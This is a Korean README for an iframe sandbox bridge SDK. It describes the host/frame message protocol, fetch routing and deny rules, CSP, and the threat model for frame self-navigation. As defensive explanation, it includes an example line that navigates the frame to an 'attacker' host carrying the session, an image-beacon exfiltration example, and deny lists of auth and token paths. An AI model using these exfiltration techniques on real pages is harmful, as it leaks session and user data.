# @bstage-sdk/bridge

템플릿을 sandbox iframe에 격리해 실행할 때 쓰는 브리지. 플랫폼(호스트)과 프레임 사이의 메시지 프로토콜,
호스트 측 요청 정책, 프레임 측 클라이언트를 담는다. 런타임 의존성은 없다.

격리는 **placement 단위 선택 기능**이다. 켜지 않은 placement는 지금처럼 inline(Shadow DOM)으로 돈다.
템플릿 코드는 바꿀 필요 없이 이 브리지를 지원하는 core·react로 다시 빌드하면 된다 — core·react가 프레임 안인지(`globalThis.__bstage_bridge__`)를 스스로
판별해 API 호출·로케일·네비게이션을 브리지로 보낸다.

## 진입점

| 경로      | 쓰는 쪽               | 내용                                                                              |
| --------- | --------------------- | --------------------------------------------------------------------------------- |
| `.`       | 공용                  | 봉투·메시지 타입과 가드, 오류 코드, `createSession`·`createNonce`, `createSrcdoc` |
| `./host`  | 플랫폼(호스트 페이지) | `createBridgeHost`, fetch 정책 기본값                                             |
| `./frame` | 프레임 안             | `createBridgeClient`, `createBridgeFetch`                                         |

## 호스트에서

```ts
import {
  createNonce,
  createSession,
  createSrcdoc,
  IFRAME_ATTRIBUTES,
} from '@bstage-sdk/bridge'
import { createBridgeHost, DEFAULT_GATEWAY_DENY_SEGMENTS } from '@bstage-sdk/bridge/host'

const session = createSession()
const iframe = document.createElement('iframe')
iframe.setAttribute('sandbox', IFRAME_ATTRIBUTES.sandbox)
iframe.setAttribute('allow', IFRAME_ATTRIBUTES.allow)
iframe.setAttribute('referrerpolicy', IFRAME_ATTRIBUTES.referrerpolicy)
iframe.title = placementName

const host = createBridgeHost({
  iframe,
  session,
  hostOrigin: location.origin,
  init: {
    placementId, // 호스트가 만든 스코프 키 — 예: `page:{경로}|{url}`, `slot:{id}|{url}`
    surface: 'page', // 'page' | 'slot'
    phase,
    spaceId,
    locale,
    theme: { dark },
    member: { signedIn },
    partnerOrigins, // 팬 토큰을 보낼 vibe 백엔드 목록(토큰 없이 부를 외부 API는 넣지 않는다)
    translations, // 선택: 현재 locale 번역 사전
  },
  fetchImpl: platformFetch, // 같은 origin /gw — 인증·목적지 허용 목록을 적용하는 플랫폼 fetch
  partnerFetchImpl, // 선택: partnerOrigins용(토큰을 붙일지는 호스트가 결정)
  // externalFetchImpl, // 선택: 그 밖의 https용. 기본은 무인증 fetch
  pinnedHeaders: { 'x-bstage-tenant-id': spaceId },
  policy: {
    gatewayDenySegments: DEFAULT_GATEWAY_DENY_SEGMENTS, // 정책을 코드에 드러낸다(필요하면 [...상수, '추가'])
    allowExternal: true, // 외부 https 갈래는 옵트인(기본 false). 미리보기처럼 막을 호스트는 생략
  },
  handlers: { navigate, back, toast, resize, track },
})

iframe.srcdoc = createSrcdoc({
  nonce: createNonce(),
  session,
  hostOrigin: location.origin,
  assetOrigin,
  entryUrl,
  elementName,
  title: placementName,
  mediaOrigins, // 선택: 템플릿이 이미지·미디어를 불러올 정확한 https origin(최대 20개)
})
container.appendChild(iframe)

// 언마운트 시
host.dispose()
```

호스트는 `ev.source === iframe.contentWindow`, origin `"null"`, 봉투 형식, `payload.session === session`이
모두 맞는 메시지만 처리한다. 토큰은 프레임으로 가지 않는다 — 인증은 `fetchImpl`이 호스트 쪽에서 붙이고,
프레임에는 상태·statusText·content-type·본문 문자열만 돌아간다.

### 세션 수명과 프레임 자기 내비게이션

템플릿은 자기 프레임을 다른 URL로 옮길 수 있다(`location = 'https://attacker/#' + session`). sandbox 플래그는
내비게이션 뒤에도 남으므로 새 문서도 origin `"null"`이고 `contentWindow`도 같다 — `ev.source`·origin 검사만으로는
옛 문서와 새 문서를 가를 수 없고, 세션은 srcdoc 본문에 있어 템플릿이 읽어 URL로 넘길 수 있다. 호스트가 iframe의
두 번째 `load`에서 `dispose()`해도 새 문서의 스크립트는 `load`보다 먼저 돈다. SDK는 이 틈을 다음으로 닫는다
(호스트 코드 변경 없음).

- **세션당 문서 하나(프레임 토큰)**: 프레임 런타임이 부트스트랩 때 문서마다 128비트 토큰을 만들어 모든 봉투 최상위
  `frame`에 싣는다. 호스트는 세션이 맞는 첫 메시지의 토큰에 세션을 묶고, 이후 **토큰이 없거나 다른** 메시지가 오면
  그 메시지를 처리하지 않고 즉시 `dispose()`한다. 같은 토큰의 `ready` 재전송에는 계속 답하지만, 다른 문서의 두 번째
  핸드셰이크는 성립하지 않는다. 세션을 URL로 받은 새 문서는 토큰을 모르므로 첫 메시지에서 세션이 끊긴다.
- **토큰은 CSPRNG로만 만든다**: `crypto.getRandomValues`가 없으면 `Math.random`으로 대신하지 않고 브리지를 열지 않는다(`frame-unload` 외에는 아무것도 보내지 않는다).
- **핸드셰이크 전에는 이벤트를 보내지 않는다**: `host.send`는 토큰이 묶이기 전에는 프레임에 보내지 않고 init에만 반영한다. init에 접히지 않는 `visibility`는 마지막 값을 묶인 직후(init 뒤) 한 번 보낸다. 공개되는 봉투 id 접두사와 따로 뽑는다.
- **토큰은 템플릿 코드에 노출하지 않는다**: 런타임 클로저에만 있고, 봉투는 객체 리터럴로 만들며(Object.prototype
  setter를 부르지 않는다) 부트스트랩 때 `bind`해 둔 `parent.postMessage`로만 보낸다. 호스트 → 프레임 메시지
  (init·응답·이벤트)에는 실리지 않는다. 그래서 템플릿이 `Object.assign`·`Function.prototype.*`·`Object.prototype`
  setter를 가로채도 보이는 것은 세션뿐이다(테스트로 고정). 세션은 템플릿이 읽을 수 있다 — 같은 문서이고 srcdoc 본문에
  있기 때문이다. 세션은 "이 iframe의 메시지"라는 표식일 뿐 비밀로 취급하지 않는다.
- **`frame-unload`**: 부트스트랩이 `pagehide`(capture, 템플릿보다 먼저 등록)에서 `evt:frame-unload`를 동기로 보낸다.
  **전송을 가장 먼저** 하고, 전송 경로는 객체 리터럴과 부트스트랩 때 잡아 둔 참조(`bind`한 `postMessage`,
  `PageTransitionEvent.prototype.persisted` 원본 접근자를 `Function.prototype.call.bind`로 묶은 것)만 쓴다.
  `clearInterval`·`clearTimeout`도 부트스트랩 때 잡고, 타이머·대기 요청 정리는 전송 뒤 각각 try로 감싼다. 그래서
  템플릿이 **리스너가 살아 있는 동안** 전역·프로토타입(`clearInterval`·`clearTimeout`·`Map.prototype.forEach`·`Error`·
  `Function.prototype.call`·`persisted` 접근자)을 바꾸거나 던지게 해도 전송은 막히지 않는다(테스트로 고정).
  `persisted` 읽기가 실패하면 bfcache 진입이 아닌 것으로 보고 보낸다(실패는 끊는 쪽으로).
  보장하지 **않는** 것: 템플릿이 `document.open()`으로 창의 이벤트 리스너를 모두 지운 뒤 내비게이션하면 `pagehide`
  처리기 자체가 돌지 않는다 — 이때는 프레임 토큰과 호스트의 두 번째 `load` dispose에 기댄다.
  호스트는 받는 즉시 `dispose()`한다 — 이후 메시지는 무시되고, dispose 뒤 끝난 요청의 응답도 프레임에 보내지 않는다.
  프레임 쪽 대기 요청은 `UNSUPPORTED`로 바로 거절된다. bfcache 진입(`persisted: true`)에는 보내지 않는다(복원되면 같은 문서가 계속 쓴다).
- **`onDispose(reason)`**(선택): 호스트가 dispose될 때 한 번 불린다. `'frame-unload'`·`'frame-mismatch'`는 호스트가
  스스로 끊은 경우, `'manual'`은 `dispose()` 호출이다. 임베더는 이 콜백에서 iframe을 바로 걷어 낼 수 있다(콜백 예외는 삼킨다).
  `beforeunload`·`unload`는 쓰지 않는다 — `beforeunload`는 호스트 페이지 자체의 이동에도 프레임에 오므로 이동이
  취소되거나 bfcache에서 복원되면 멀쩡한 템플릿이 끊기고, 하위 프레임의 `unload` 리스너는 호스트 페이지의 bfcache를
  막고 폐기 중인 API다.

**남는 위험(정직하게)**

- 막는 것은 "새 문서가 유효한 교환을 하는 것"이다. 새 문서가 **메시지를 보내지 않고 기다리면**, 호스트가 알아채기
  전까지(`frame-unload` 처리 또는 두 번째 `load`) `host.send`로 보내는 이벤트(`locale`·`theme`·`member`의
  `signedIn`·`nickname`·`slot.context`·`visibility`)를 받을 수 있다. Chromium은 다른 프로세스로 가는 하위 프레임
  내비게이션에서 옛 문서의 `pagehide`를 새 문서 커밋과 병렬로 돌리므로 이 틈은 0이 아니다. 이벤트·init에 민감 정보를
  싣지 않는다는 원칙이 여기서도 경계다.
- 토큰 비공개는 JS 수준 보장이다. 엔진 버그나 이 SDK가 놓친 관찰 경로로 원래 문서의 템플릿이 토큰을 얻어 URL로 넘기면,
  새 문서는 `frame-unload`가 처리되기 전까지 유효한 요청을 보낼 수 있다. 이 경우의 마지막 방어선은 `frame-unload`와
  호스트의 두 번째 `load` dispose다.
- **진행 중인 요청의 응답**: 원래 문서가 보낸 요청의 응답이 내비게이션 뒤·dispose 전에 끝나면, 호스트는 그 응답을
  `iframe.contentWindow`(= 새 문서)로 보낸다. 새 문서는 응답 봉투를 읽을 수 있다. dispose 뒤에 끝난 응답은 버리지만
  호스트 쪽 fetch 자체를 중단하지는 않는다(dispose 시 진행 중 fetch abort는 후속 과제).
- 세션을 아는 쪽(= 그 프레임의 템플릿)은 잘못된 토큰을 보내 자기 세션을 끊을 수 있다. 자기 자신에 대한 서비스 거부일 뿐이다.
- 호스트는 srcdoc마다 새 세션(`createSession()`)을 만들고 세션 하나에 `createBridgeHost`를 하나만 둔다. 같은 세션으로
  호스트를 다시 만들면 묶임이 새로 시작된다.
- **같은 srcdoc의 재로드·재삽입에는 새 호스트가 필요하다**: iframe을 DOM에서 옮기거나 다시 넣거나 `srcdoc`를 다시 설정하면
  새 문서(새 프레임 토큰)가 뜨므로, 옛 호스트는 `frame-unload`나 `frame-mismatch`로 끊기고 그 문서는 브리지를 쓰지 못한다.
  이때는 새 세션으로 `createSrcdoc`·`createBridgeHost`를 다시 만든다(`onDispose`로 감지할 수 있다).

### fetch 정책

`new URL(url, hostOrigin)`으로 정규화한 뒤 목적지를 네 갈래로 나눈다.

| 갈래       | 조건                                                                                                              | fetch               | 자격증명·헤더                                                       |
| ---------- | ----------------------------------------------------------------------------------------------------------------- | ------------------- | ------------------------------------------------------------------- |
| `gateway`  | 같은 origin, 경로가 `gatewayPrefixes`(기본 `["/gw/"]`, `/gw` 정확 일치 포함) 안·거절 규칙 밖                      | `fetchImpl`         | `credentials: 'same-origin'`, 허용 헤더 + `pinnedHeaders`           |
| `partner`  | `partnerOrigins`(**팬 토큰을 보낼 vibe 백엔드**, https 정확한 origin, 최대 10개, hostOrigin 제외)와 정확히 일치   | `partnerFetchImpl`  | `credentials: 'omit'`, `referrerPolicy: 'no-referrer'`, 허용 헤더만 |
| `external` | 그 밖의 https origin(hostOrigin 아님). **등록 불필요**. `policy.allowExternal: true`일 때만(기본 `false`, 옵트인) | `externalFetchImpl` | `credentials: 'omit'`, `referrerPolicy: 'no-referrer'`, 허용 헤더만 |
| 거절       | http, userinfo, 비 http 스킴, 같은 origin의 `/gw` 밖·거절 경로, `allowExternal`을 켜지 않았을 때의 external       | —                   | `FORBIDDEN_DESTINATION`                                             |

- 세 갈래 모두 `redirect: 'error'`, 메서드·본문 상한·분당/동시 요청 상한·응답 본문 상한이 같게 적용된다.
- 같은 origin은 gateway 규칙만 적용한다. hostOrigin을 파트너 목록에 넣어도 `/gw` 밖 경로는 열리지 않고, external로도 통과하지 않는다.
- `pinnedHeaders`(테넌시·앱 헤더)는 **gateway에만** 싣는다. partner·external에는 프레임이 보낸 허용 헤더만 간다.
- external·partner 기본 fetch는 `globalThis.fetch`를 쿠키·인증 헤더·Referer 없이 부른다. 응답은 호스트 페이지 origin 기준 CORS를 따른다.
- external은 요청이 사용자 브라우저에서 호스트 `Origin`으로 나가므로 **IP 리터럴·단일 레이블·빈 레이블·로컬/예약 이름(`localhost`·`local`·`internal`·`home.arpa`·`test`·`invalid`·`example`·`lan`·`corp`·`intranet`·`localdomain`과 그 하위)·
  호스트와 같은 호스트명(다른 포트·끝 점 몇 개든)**을 겨누지 못한다(사설 IP로 풀리는 DNS 이름은 브라우저의 Local Network Access가 다룬다).
  `x-bmf-sdk-version` 같은 비단순 헤더를 external에 실으면 CORS preflight가 생겨 공개 API가 거절할 수 있다.
- `externalFetchImpl`에 `fetchImpl`(인증 fetch)이나 `partnerFetchImpl`(팬 토큰 fetch)을 그대로 넘기면 생성 시 `TypeError`.
- `partnerFetchImpl`에 `fetchImpl`(게이트웨이 인증 fetch)을 그대로 넘겨도 생성 시 `TypeError` — 파트너 갈래에는 게이트웨이 경로 거절 규칙이 적용되지 않는다.
- **알려진 한계(external)**: 호스트명 검사는 이름만 본다. ① 같은 사이트의 다른 호스트(예: 호스트가 `space.example.com`일 때 `api.example.com`)로의
  무인증 요청은 막지 않는다 — 쿠키·인증 헤더는 싣지 않지만, 그 호스트가 호스트 origin에 CORS를 열어 두었다면 응답을 읽을 수 있다.
  ② 공개 DNS 이름이 사설·루프백 IP로 풀리는 경우(DNS rebinding 포함)는 SDK가 판정하지 못하고 브라우저의 Local Network Access에 맡긴다.
  둘 다 막아야 하는 호스트는 `allowExternal`을 끄거나 `externalFetchImpl`에서 목적지를 직접 걸러야 한다.
- 같은 origin 경로 구조 검사(navigate와 공용): 원문을 `decodeURIComponent`로 최대 3회 고정점까지 풀고,
  디코딩 실패(overlong·잘못된 UTF-8, 예: `%c0%af`)·고정점 미도달이거나 어느 단계에든 역슬래시·`;`·NUL/제어문자·
  점 세그먼트(`/../`·`/./`·끝의 `/..`·`/.`)가 있으면 거절한다. 세그먼트 안 정상 인코딩(`/gw/x/a%2Fb`)은 통과.
  navigate는 여기에 `//` 금지와 `new URL(path, hostOrigin).origin === hostOrigin`을 더한다.
- **게이트웨이 거절 접두사** `gatewayDenyPrefixes`(기본 `["/gw/account/v1/auth/", "/gw/account/v1/users/logout"]`):
  토큰 갱신은 refresh 쿠키로 새 access token을 응답 본문에 돌려주므로 프레임이 닿으면 안 된다. 디코딩·슬래시 병합·
  소문자화한 모든 단계로 비교하며, 걸리면 `FORBIDDEN_DESTINATION`. 여기에 **거절 세그먼트** `gatewayDenySegments`
  (기본 `DEFAULT_GATEWAY_DENY_SEGMENTS` = `auth`·`logout`·`mfa`·`token`·`oauth`·`sso`·`debug`·`debugger`·`xdebug`·`withdraw`)를
  경로 어디에 있든 막는다(호스트가 넘긴 값은 소문자로 정규화해 비교) — 실제 인증 경로는 `/gw/svc/account/api/v1/auth/token/refresh`처럼 서비스·버전 접두사가 붙기 때문이다.
  기본값은 패키지 버전마다 늘 수 있다. 호스트는 상수를 명시해 넘겨 정책을 코드에 드러내고, 고정이 필요하면 리터럴 목록을 넘긴다. 이와 별개로 **`token`이 들어간 세그먼트**
  (`tokens`·`access-tokens`·`refreshToken`)는 정책과 무관하게 항상 거절한다 — `device-tokens`·`tokenization` 같은 정상 API도
  격리 프레임에서는 부를 수 없다(수용한 제약). 거절 규칙은 gateway 경로에만 적용한다.
- userinfo가 붙은 URL은 거절한다.
- 메서드는 GET·HEAD·POST·PUT·PATCH·DELETE.
- 요청 헤더는 `content-type`·`accept`·`accept-language`, 앱 헤더 `x-bstage-app-id`·`x-bstage-app-key`, `x-bmf-sdk-version`만 프레임 값을
  통과시킨다(대소문자 무시, 세 갈래 공통). **테넌시 헤더(`x-bstage-tenant-id`·`x-bstage-org-id`·`x-bstage-enterprise-id`)는 프레임 값을
  버리고** 호스트가 `pinnedHeaders`로 준 값만 게이트웨이 요청에 싣는다(앱 헤더도 여기 주면 프레임 값을 덮는다).
  `authorization`·`cookie`·(`x-bmf-sdk-version` 밖의) `x-bmf-*` 등 나머지는 버린다. 템플릿의 `BstageClient`가 테넌트 헤더를 보내므로 호스트는
  `pinnedHeaders: { 'x-bstage-tenant-id': spaceId }`처럼 현재 스페이스 값을 고정해야 한다.
- 본문은 문자열만, UTF-8 바이트로 `maxBodyBytes`(기본 1MB) 이하. 프레임별 분당 `maxRequestsPerMinute`(기본 300,
  resize 제외), 동시 진행 fetch 16개, toast 분당 5회, ready 응답 초당 2회, resize 초당 30회.
- 응답 본문은 스트림으로 읽으며 `maxResponseBytes`(기본 10MB)를 넘는 순간 취소한다.
- 호출 인자: gateway는 `fetchImpl(url, { method, headers, body, credentials: 'same-origin', redirect: 'error' })`,
  partner·external은 `partnerFetchImpl`·`externalFetchImpl(url, { ..., credentials: 'omit', redirect: 'error', referrerPolicy: 'no-referrer' })`.

### 파트너·외부 fetch

`fetchImpl`(플랫폼 인증 fetch)은 **같은 origin `/gw` 요청에만** 쓴다 — `/gw` 밖 같은 origin 경로에 쓰지 않는다
(정책이 그런 요청을 만들지 않으며, 주입하는 쪽도 그 용도로 재사용하지 않는다).

`partnerFetchImpl`의 기본값은 `globalThis.fetch`를 쿠키 없이(`credentials: 'omit'`), 인증 헤더 없이,
`redirect: 'error'`로 부른다. 파트너 요청은 플랫폼 인증 fetch(`fetchImpl`)를 거치지 않는다.
**인증을 붙이는 `partnerFetchImpl`을 주입하는 쪽은, 파트너 백엔드가 받은 자격증명을 응답 본문에 되돌려
프레임으로 흘릴 수 있다는 위험을 받아들이는 것이다.** 그래서 `partnerOrigins`에는 팬 토큰을 보낼 vibe 백엔드만 넣는다.

`externalFetchImpl`의 기본값도 같은 무인증 fetch다. 토큰 없이 부르는 공개 API·CDN은 등록 없이 이 갈래로 간다.
external에 인증을 붙이는 fetch를 주입하지 않는다. 외부 갈래는 **옵트인**이다 — 켜면 프레임이 임의 https로 데이터를 보내고 응답을 읽는 양방향 채널이 생기므로, 패키지를 올리기만 해서 열리지 않게 기본을 `false`로 둔다. 외부 호출을 허용하는 호스트만 `allowExternal: true`를 명시한다(포털 미리보기 등은 생략).

## 요청과 이벤트

| 요청(프레임 → 호스트) | payload                             | 비고                                                   |
| --------------------- | ----------------------------------- | ------------------------------------------------------ |
| `fetch`               | `{ url, method?, headers?, body? }` | 위 정책                                                |
| `navigate`            | `{ path }`                          | `/`로 시작, `//`·`/\`·공백·제어문자 거절               |
| `back`                | `{}`                                |                                                        |
| `openExternal`        | `{ url }`                           | https만. 처리기가 없으면 `noopener,noreferrer`로 새 창 |
| `toast`               | `{ message, kind? }`                | 500자에서 자름                                         |
| `resize`              | `{ height }`                        | 0~20000px, rAF 디바운스                                |
| `track`               | `{ name, params? }`                 | 이름 100자, params 직렬화 4KB                          |
| `storage`             | `{ op, key, value? }`               | placement 스코프 메모리(키 50개, 값 4KB)               |
| `log`                 | `{ level, message }`                | real phase에서는 버림                                  |

이벤트(호스트 → 프레임, `host.send`): `slot.context`·`locale`(`{ locale, translations? }`)·`member`·`theme`·`visibility`.

오류 코드: `FORBIDDEN_DESTINATION`·`FORBIDDEN_METHOD`·`BODY_TOO_LARGE`·`RATE_LIMITED`·`BAD_REQUEST`·`TIMEOUT`·`NETWORK_ERROR`·`UNSUPPORTED`.
프레임 요청은 15초 안에 응답이 없으면 `TIMEOUT`. 핸드셰이크(`ready`)는 init을 받을 때까지 재전송한다(처음 10초는 250ms, 이후 2초 간격).
프레임 → 호스트 봉투에는 최상위 `frame`(프레임 토큰)이 붙고, 문서가 내려갈 때 `evt:frame-unload`(`FRAME_UNLOAD_EVENT`)가 간다(위 "세션 수명").

## 프레임 문서

`createSrcdoc`가 만드는 문서는 CSP로 프레임의 직접 네트워크를 좁힌다. 스크립트는 nonce가 붙은
부트스트랩과 `assetOrigin`의 번들만 실행된다. 부트스트랩은 브리지 클라이언트를 설치하고 init을 받은 뒤
엔트리를 로드해 custom element를 붙이고, 문서 높이를 `resize`로 보고한다.

```
default-src 'none'
script-src 'nonce-…' {assetOrigin}
style-src 'unsafe-inline' {assetOrigin}
img-src {assetOrigin} {mediaOrigins…} data: blob:
font-src {assetOrigin} data:
media-src {assetOrigin} {mediaOrigins…} blob:
connect-src 'none'; frame-src 'none'; form-action 'none'; base-uri 'none'
```

- `fetch`·XHR·WebSocket·EventSource는 `connect-src 'none'`으로 막힌다. API 호출은 브리지(`request`)로만 간다 —
  `allowExternal: true`면 브리지가 무인증 외부 https 호출을 중개하므로, 프레임이 가진 데이터는 이 경로로도 밖에 나갈 수 있다.
- img-src·media-src에 맨 `https:`는 두지 않는다 — 두면 `<img src="https://임의-origin/?d=…">`가 자유로운 GET
  유출 통로가 된다. 외부 이미지·미디어가 필요하면 `mediaOrigins`에 **정확한 https origin**만 넘긴다
  (경로·쿼리·userinfo·와일드카드·대문자 호스트 불가, 최대 20개, 하나라도 틀리면 `TypeError`). font-src는 넓히지 않는다.
- **CSP는 심층 방어이지 경계가 아니다.** 프레임은 자기 자신을 다른 URL로 이동(`location = …`)시킬 수 있고, 이 내비게이션은
  CSP로 막히지 않으므로 URL에 실은 데이터는 여전히 밖으로 나갈 수 있다. 실제 경계는 **자격증명(토큰·쿠키)이 프레임에
  절대 들어가지 않는다**는 것이다 — 인증은 호스트의 `fetchImpl`이 붙이고, 토큰을 응답으로 돌려주는 인증 경로는
  게이트웨이 거절 목록(`gatewayDenyPrefixes`·`gatewayDenySegments`)으로 막는다. 프레임에 넘기는 init·이벤트·응답에 민감 정보를 싣지 않는다.

프레임 안 제약: 쿠키·`localStorage`·호스트 DOM에 접근할 수 없다(opaque origin). 번역 사전은 CDN이 아니라
호스트가 init·`locale` 이벤트의 `translations`로 넘긴다. 브리지 모드의 `fetchTranslations`는 **현재 locale 사전만**
돌려주고, 다른 locale(폴백 체인의 `en`·`ko` 등)은 빈 사전 `{}`이다. 같은 locale에 사전만 새로 와도 `useBstageTranslations`가 다시 읽는다.

## 개발 메모

프레임 런타임(`src/frame/runtime.ts`·`createBridgeFetch.ts`)은 `Function.prototype.toString()`으로 srcdoc에 심기는 자기완결 함수다. 바깥 식별자를 참조하거나 헬퍼가 주입되는 문법을 쓰지 않는다. 코드를 주입하는 커버리지 계측(istanbul)은 직렬화를 깨므로 v8 커버리지만 쓴다.
